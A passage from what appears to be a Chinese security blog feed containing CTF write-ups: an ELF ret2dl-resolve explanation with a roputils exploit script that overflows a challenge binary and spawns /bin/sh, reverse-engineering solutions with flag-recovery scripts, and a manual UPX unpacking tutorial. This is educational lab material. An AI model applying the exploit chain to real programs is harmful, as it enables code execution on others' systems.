class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Section st_shndx; // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p><p>read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。</p><p>并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048228                            0&gt;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048248                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048258                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:08048268                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048278 ; ELF String Table</span><br><span class="line">LOAD:08048278 byte_8048278    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048278                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &apos;strlen&apos;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482B2                                         ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br></pre></td></tr></table></figure><p>Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。</p><ol start="5"><li>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</li></ol><h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kanxueCTF-2019</title>
      <link href="/2019/03/14/kanxuectf-2019/"/>
      <url>/2019/03/14/kanxuectf-2019/</url>
      <content type="html"><![CDATA[<p><em>刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf</em></p><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p>win32 gui 输入注册码，错误会有提示</p><p>od 打开，搜索字符串，找到判断结果的函数位置；</p><p>ida 打开，找到od确定的函数位置，根据ida的交叉引用，找到了判断的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_401770      proc near               ; CODE XREF: sub_4017F0+83↓p</span><br><span class="line"></span><br><span class="line">BOOL __cdecl sub_4017F0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; // eax</span><br><span class="line">  char Str1[28]; // [esp+D8h] [ebp-24h]</span><br><span class="line">  int v3; // [esp+F4h] [ebp-8h]</span><br><span class="line">  int v4; // [esp+F8h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(a1 + 4 * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = 0;</span><br><span class="line">  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  else</span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aAbcdefghiabcde db &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;,0</span><br></pre></td></tr></table></figure><p>可以看到就是字符串对应，直接写脚本<br>中间卡了一下就是得到的是数字位置，如19，42什么的，但是输入没法这样，出去溜了个弯，回去在od strcmp之前下了个断点，查看对输入字符串的处理，之后突然意识到可能是 0-9 a-z A-Z 对应，尝试了一下，bingo</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">b = &apos;KanXueCTF2019JustForhappy&apos;</span><br><span class="line">array = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">c = &apos;&apos; </span><br><span class="line"></span><br><span class="line">for i in range(len(b)):</span><br><span class="line">for j in range(len(a)):</span><br><span class="line">if b[i]== a[j]:</span><br><span class="line">c += array[j]</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><h1 id="Repwn"><a href="#Repwn" class="headerlink" title="Repwn"></a>Repwn</h1><p>中间卡住了。。好在后面还是把解出来了哈哈哈哈，先说下目前的思路</p><p>还是先拖进od然后搜索出现的字符串，不记得是用ida还是od找到了判断入口，下断点，同时在ida中找到函数位置，反汇编，可以看到层层嵌套的判断</p><p>第一次 判断了13位，也可以因此确定其中的13位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1 = 8;</span><br><span class="line"> v2 = 0;</span><br><span class="line"> v8 = &apos;ruoY&apos;;</span><br><span class="line"> v9 = &apos;pnI_&apos;;</span><br><span class="line"> v10 = &apos;I_tu&apos;;</span><br><span class="line"> v11 = &apos;rW_s&apos;;</span><br><span class="line"> v12 = &apos;gno&apos;;</span><br><span class="line"> v4 = &apos;0Y1X&apos;;</span><br><span class="line"> v5 = &apos;t3Nu&apos;;</span><br><span class="line"> v6 = &apos;d00G&apos;;</span><br><span class="line"> v7 = 0;</span><br><span class="line"> while ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + key) )</span><br><span class="line"> &#123;</span><br><span class="line">   ++v2;</span><br><span class="line">   ++v1;</span><br><span class="line">   if ( v2 &gt; 11 )</span><br><span class="line">   &#123;</span><br><span class="line">     result = 1;</span><br><span class="line">     if ( *(_BYTE *)(key + 20) == &apos;H&apos; )</span><br><span class="line">       return result;</span><br><span class="line">     return 0;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br></pre></td></tr></table></figure></p><p>第二次,确定了序列长度，同时在检查第三步回来之后还会对最后四位处理，最后会将其覆盖到返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(Str) == 24 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( check3((int)Str) )</span><br><span class="line">   &#123;</span><br><span class="line">     Str[20] -= 88;</span><br><span class="line">     Str[21] -= 70;</span><br><span class="line">     Str[22] -= 3;</span><br><span class="line">     Str[23] -= 107;</span><br><span class="line">     strcpy(&amp;Dest, Str);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   printf(&quot;String Length is Wrong&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>第三次，也就是最后一次，，deal_8对前八位全部减0x30， 第三次通过计算可以确定第五到八位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> deal_8(a1);</span><br><span class="line">  v1 = no_4 + 1000 * fl[0] + 100 * no_2 + 10 * no_3;</span><br><span class="line">  v2 = no_6 + 10 * no_5;</span><br><span class="line">  v3 = no_8 + 10 * no_7;</span><br><span class="line"></span><br><span class="line">  if ( 2 * (v1 + v2) != 4040 || 3 * v2 / 2 + 100 * v3 != 115 )// v1+v2 = 0x7e4</span><br><span class="line">    goto LABEL_2;</span><br><span class="line">  result = 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( v1 - 110 * v3 != 1900 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Key_Is_Wrong,Please_Input_Again!&quot;);</span><br><span class="line">LABEL_2:</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过不断的尝试＋猜测，终于试出了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20101001X1Y0uN3tG00dHaCk</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku-reverse prac</title>
      <link href="/2019/03/13/bugku-reverse-prac/"/>
      <url>/2019/03/13/bugku-reverse-prac/</url>
      <content type="html"><![CDATA[<h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><p><em>其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开是dos窗口，等待输入flag，随便输入后直接退出</p><p>拖入IDA，重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int len; // eax</span><br><span class="line">  const char *v1; // eax</span><br><span class="line">  size_t real_len; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  __int64 v4; // ST08_8</span><br><span class="line">  signed int j; // [esp-B0h] [ebp-B0h]</span><br><span class="line">  signed int i; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  signed int v8; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  int v9; // [esp-98h] [ebp-98h]</span><br><span class="line">  int flag; // [esp-2Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp-10h] [ebp-10h]</span><br><span class="line">  int v12; // [esp-4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    *((_BYTE *)&amp;v12 + i - 0x94) = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  puts_(&quot;please enter the flag:&quot;);</span><br><span class="line">  scanf(&quot;%20s&quot;, &amp;flag);</span><br><span class="line">  len = j_strlen((const char *)&amp;flag);</span><br><span class="line">  v1 = (const char *)deal((int)&amp;flag, len, (int)&amp;v11);</span><br><span class="line">  strncpy((char *)&amp;v9, v1, 40u);</span><br><span class="line">  v8 = j_strlen((const char *)&amp;v9);</span><br><span class="line">  for ( j = 0; j &lt; v8; ++j )</span><br><span class="line">    *((_BYTE *)&amp;v12 + j - 0x94) += j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  real_len = j_strlen((const char *)&amp;v9);</span><br><span class="line">  if ( !strncmp((const char *)&amp;v9, Str2, real_len) )</span><br><span class="line">    puts_(&quot;rigth flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts_(&quot;wrong flag!\n&quot;);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Str2            db &apos;e3nifIH9b_C@n@dH&apos;,0</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序流程也比较清晰，初始时将一段栈内存置为0，可以看到是在v9处，之后请求输入flag，然后对输入的flag deal加密处理<br>然后处理得到的字符串再次每位加i，相当于第二次加密，之后将其与一段字符串相比，相等的话就输出right flag</p><p>所以问题的重点其实是第一次加密是怎样处理的，ida中看到一堆abcdef…，想着可能是base64，但是不确定。</p><p>将文件拖入x32dbg 先运行起来，然后搜索字符串，找到主函数的位置，根据ida可以知道在第一次加密之后调用了strncpy，所以我们在搜索到wrong flag地址，往上翻，可以大概确定加密的地址，在其之后下断点，运行程序输入任意flag，因为约定函数返回值是存在eax中的，查看此时的eax，发现其值就是输入flag的base64，接下来写脚本就完事了</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">string=&apos;e3nifIH9b_C@n@dH&apos;</span><br><span class="line">unstring = &apos;&apos;</span><br><span class="line">for i in range(len(string)):</span><br><span class="line">unstring += chr(ord(string[i])-i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(unstring)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python lovewp.py </span><br><span class="line">&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reverse Learning-unpack</title>
      <link href="/2019/03/13/reverse-learning-unpack/"/>
      <url>/2019/03/13/reverse-learning-unpack/</url>
      <content type="html"><![CDATA[<p><em>学习一下基础的软件脱壳，之后慢慢更新</em></p><h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>upx属于比较经典的压缩壳，支持大多数操作系统运行文件，可以使压缩过的可执行文件体积缩小50%-70% ；</p><p>文件位压缩后的运行方式便是在压缩文件的开始加入解压缩的代码，所以程序在运行完解压缩代码之后，程序的代码实际上就与压缩前一致了，而这也是我们可以手动调试脱壳的前提。</p><h2 id="pack"><a href="#pack" class="headerlink" title="pack"></a>pack</h2><p>先下载 <a href="https://upx.github.io/" target="_blank" rel="noopener">upx</a></p><p>od 查看文件在upx 之前的内存情况，从开始处，信息比较清楚</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/1.png" alt="未加壳" title="" class="">                <p>未加壳</p>            </figure><p>命令行调用upx 给文件加壳   <code>./upx.exe filename.exe</code></p><p>再次查看文件情况，当然也可以使用IDA。</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/2.png" alt="加壳" title="" class="">                <p>加壳</p>            </figure><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><ol><li>upx自带脱壳命令，加个-d 就是脱壳模式</li><li>手动脱壳</li></ol><p>文件起始有个pushad将所有寄存器的值入栈，之后从加壳后的文件起始处按f8单步往后走，发现不久后就开始了反复循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004079D0   &gt; /8A06          mov al,byte ptr ds:[esi]</span><br><span class="line">004079D2   . |46            inc esi                                  ;  upxpacke.00407006</span><br><span class="line">004079D3   . |8807          mov byte ptr ds:[edi],al</span><br><span class="line">004079D5   . |47            inc edi                                  ;  upxpacke.00401002</span><br><span class="line">004079D6   &gt; |01DB          add ebx,ebx</span><br><span class="line">004079D8   . |75 07         jnz short upxpacke.004079E1</span><br><span class="line">004079DA   &gt; |8B1E          mov ebx,dword ptr ds:[esi]</span><br><span class="line">004079DC   . |83EE FC       sub esi,-0x4</span><br><span class="line">004079DF   . |11DB          adc ebx,ebx</span><br><span class="line">004079E1   &gt;^\72 ED         jb short upxpacke.004079D0</span><br></pre></td></tr></table></figure><p>可以看到大概意思就是在疯狂复制esi地址的数据到 edi地址处</p><p>而我们只需要找到之后的popad就可以了，所以右键-&gt;serch for-&gt;command 或直接 ctrl+F 寻找popad ，不过这里需要去掉entire block的勾选，否则会找到起始地址之前的popad，找到之后f2下断点，f9直接运行到这里</p><p>之后继续单步,一个小循环之后，跳转到一个地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00407B66   .  61            popad</span><br><span class="line">00407B67   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00407B6B   &gt;  6A 00         push 0x0</span><br><span class="line">00407B6D   .  39C4          cmp esp,eax</span><br><span class="line">00407B6F   .^ 75 FA         jnz short upxpacke.00407B6B</span><br><span class="line">00407B71   .  83EC 80       sub esp,-0x80</span><br><span class="line">00407B74   .- E9 C897FFFF   jmp upxpacke.00401341</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00401341    E8 83040000     call upxpacke.004017C9</span><br><span class="line">00401346  ^ E9 B3FDFFFF     jmp upxpacke.004010FE</span><br><span class="line">0040134B    8BFF            mov edi,edi                              ; upxpacke.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040134D    55              push ebp</span><br><span class="line">0040134E    8BEC            mov ebp,esp</span><br><span class="line">00401350    81EC 28030000   sub esp,0x328</span><br></pre></td></tr></table></figure><p>到达该地址后，可以看到有个call函数，此时就可以使用od 的插件OllyDump将文件脱壳，需要注意的是重建输入表一般会选择方式二，其他的可以根据情况来定，这次保持默认就可以了</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/3.png" alt="ollydump" title="" class="">                <p>ollydump</p>            </figure><p>打开输出的脱壳的文件，找到最初始的地方，发现与脱壳前一样，也就是说脱壳成功</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/4.png" alt="脱壳效果" title="" class="">                <p>脱壳效果</p>            </figure><h1 id="aspack"><a href="#aspack" class="headerlink" title="aspack"></a>aspack</h1><h2 id="type-1"><a href="#type-1" class="headerlink" title="type"></a>type</h2><p>专门针对win32程序的压缩软件，整体原理与upx差不多所以方法实际上是可以通用的。</p><h2 id="unpack-1"><a href="#unpack-1" class="headerlink" title="unpack"></a>unpack</h2><p>aspack popad不容易找到，所以可以使用其他的办法来</p><p>这里可以确定0x401000是程序本身的初始位置，只是在没有解包之前，这里还无法反汇编。</p><p>我们这里使用硬件断点(硬件断点不通过0xCC/<em>int 